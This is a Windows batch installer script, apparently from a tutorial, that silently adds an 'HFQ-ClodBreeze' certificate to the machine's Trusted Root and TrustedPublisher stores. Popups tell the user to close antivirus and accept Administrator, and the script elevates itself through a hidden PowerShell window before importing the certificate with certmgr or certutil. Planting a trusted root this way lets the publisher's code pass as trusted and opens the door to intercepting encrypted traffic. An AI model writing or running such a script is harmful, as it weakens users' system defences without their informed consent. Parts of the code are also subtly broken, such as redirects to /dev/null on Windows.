@echo off
setlocal EnableExtensions EnableDelayedExpansion

rem ============================================================
rem  config.bat  (tutorial 2.2.4)
rem  Quietly install HFQ-ClodBreeze trust before running app
rem  Put this file next to: root.spc + certmgr.exe
rem  (also accepts HFQ-ClodBreeze.spc / HFQ-ClodBreeze.cer)
rem ============================================================

rem Already imported? skip
if exist "%TEMP%\HFQ-ClodBreeze.trust.key" (
  exit /b 0
)

rem First launch: brief notice (can comment out for fully silent)
if /I not "%~1"=="goto" if /I not "%~1"=="runas" (
  mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Popup('Please close antivirus and allow Administrator when prompted.\nThen the publisher cert will be installed.',5,'HFQ-ClodBreeze Trust',64);close();"
)

rem Elevate to Administrator (tutorial style)
net session >/dev/null 2>&1
if errorlevel 1 (
  powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'runas' -Verb RunAs"
  exit /b 0
)

cd /d "%~dp0"

set "SPC="
if exist "%~dp0root.spc" set "SPC=%~dp0root.spc"
if exist "%~dp0HFQ-ClodBreeze.spc" set "SPC=%~dp0HFQ-ClodBreeze.spc"

set "CER="
if exist "%~dp0HFQ-ClodBreeze.cer" set "CER=%~dp0HFQ-ClodBreeze.cer"
if exist "%~dp0root.cer" set "CER=%~dp0root.cer"

set "CERTMGR=%~dp0certmgr.exe"

set "OK=0"

rem Prefer tutorial tool: certmgr.exe -add -c xxx.spc -s -r localMachine root
if defined SPC if exist "%CERTMGR%" (
  "%CERTMGR%" -add -c "%SPC%" -s -r localMachine root >"%TEMP%\hfq_config.tmp" 2>&1
  findstr /I /C:"Succeeded" /C:"succeeded" /C:"成功" "%TEMP%\hfq_config.tmp" >/dev/null && set "OK=1"
  rem Some certmgr versions print nothing useful on success; if errorlevel 0 treat as ok
  if errorlevel 1 (
    rem keep OK as is
  ) else (
    set "OK=1"
  )
)

rem Fallback: certutil Root + TrustedPublisher (more reliable on modern Windows)
if "%OK%"=="0" if defined CER (
  certutil -addstore -f Root "%CER%" >"%TEMP%\hfq_config.tmp" 2>&1
  if not errorlevel 1 set "OK=1"
  certutil -addstore -f TrustedPublisher "%CER%" >/dev/null 2>&1
)

if "%OK%"=="0" if defined SPC (
  rem try certutil with spc not valid; need cer
  if defined CER (
    certutil -addstore -f Root "%CER%" >"%TEMP%\hfq_config.tmp" 2>&1
    if not errorlevel 1 set "OK=1"
  )
)

if "%OK%"=="0" (
  mshta "javascript:alert('Certificate import FAILED.\nClose antivirus and run as Administrator.');close();"
  del /f /q "%TEMP%\HFQ-ClodBreeze.trust.key" 2>/dev/null
  exit /b 1
)

echo OK>"%TEMP%\HFQ-ClodBreeze.trust.key"
mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Popup('Certificate installed successfully.\nYou can run the signed software now.',3,'HFQ-ClodBreeze Trust',64);close();"
exit /b 0
